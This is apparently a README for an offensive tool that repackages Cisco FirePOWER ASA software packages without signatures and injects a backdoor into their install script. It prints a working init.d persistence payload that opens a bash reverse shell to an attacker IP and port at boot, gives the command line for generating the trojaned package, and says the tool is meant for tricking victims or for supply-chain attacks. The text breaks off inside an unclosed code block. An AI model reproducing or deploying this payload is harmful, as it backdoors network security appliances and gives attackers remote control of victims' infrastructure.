# What's Up?

*What's Up?* is a tool for embedding a reverse shell in [FirePOWER Services Software for ASA](https://software.cisco.com/download/home/286283326/type/286277393/release/6.2.3) installation packages (e.g. asasfr-sys-6.2.3-83.pkg). The packages, as provided by Cisco, are encrypted **and** signed and therefore cannot be modified. However, the ASA FirePOWER module boot image *will* accept an unsigned package as long as it's packaged correctly.

*What's Up?* will unpackage the encrypted and signed package, reformat the data into an unsigned package, and insert the desired reverse shell into the package's installation script (`install.sh`). When the victim installs the package, the following payload will be added to the `init.d` scripts with a corresponding symlink in `/etc/rc.d/rc3.d/`

```
#!/bin/sh

source /etc/rc.d/init.d/functions
PATH="/usr/local/bin:/usr/bin:/bin:/usr/local/sf/bin:/sbin:/usr/sbin"

xploit_start() {
  (sleep 300 && /bin/bash -i >& /dev/tcp/10.0.0.28/1270 0>&1)&
}

case "\$1" in
'start')
  xploit_start
  ;;
*)
  echo "usage $0 start|stop|restart"
esac
```

*What's Up* generated packages are most likely useful when tricking a user to install content. For example, if an unexpecting soul downloads the package off of the internet or a trusted 3rd party instructs the victim to install the malicous package. Technically speaking, it's also useful in a supply chain attack, but an attacker can do that manually as well.

## Performance

*What's Up?* is sort of slow. Due to the amount of decryption, unpacking, and repacking, it can take up to 15 minutes to run. I also foolishly shove the entirety of the `pkg` file into memory... twice! So it can be a real memory hog too. 

## Tested?

*What's Up?* was written and tested on Ubuntu 20.04.04. I don't promise it will work anywhere else. I've manipulated the following packages and verified the following boot images load them:

* [asasfr-sys-5.4.1-211.pkg](https://software.cisco.com/download/home/286283326/type/286277393/release/5.4.1) using [asasfr-5500x-boot-5.4.1-211.img](https://www.virustotal.com/gui/file/0f231a57651c3054fab788ebc0f58bf66af27329a754443e336d714c3b04da53)
* [asasfr-sys-6.2.3-83.pkg](https://software.cisco.com/download/home/286283326/type/286277393/release/6.2.3) using [asasfr-5500x-boot-6.2.3-4.img](https://www.virustotal.com/gui/file/3c15f8c9d3b4480f97ae61a070e1fe33749dcde609e95002ce755e90d1bbde71)

Unfortunately, `pkg` files are too large for VirusTotal.

## Usage Example

*What's Up* accepts three inputs:

* A valid/signed Cisco created FirePOWER software package (e.g. asasfr-sys-6.2.3-83.pkg)
* An LHOST to connect back to (e.g. 10.0.0.28)
* An LPORT to connect back to (e.g. 1270)

```
albinolobster@ubuntu:~/whatsup/build$ ./whatsup -i ~/Desktop/asasfr-sys-5.4.1-211.pkg --lhost 10.0.0.28 --lport 1270

## Installation Example

The `new.pkg` file then needs to be installed on an ASA-X with FirePOWER services. Installation goes something like this (note that the output is overly simplified - actual installation can take ~2 hours and some commands will not immediately be available because the software is chugging along in the background):

```
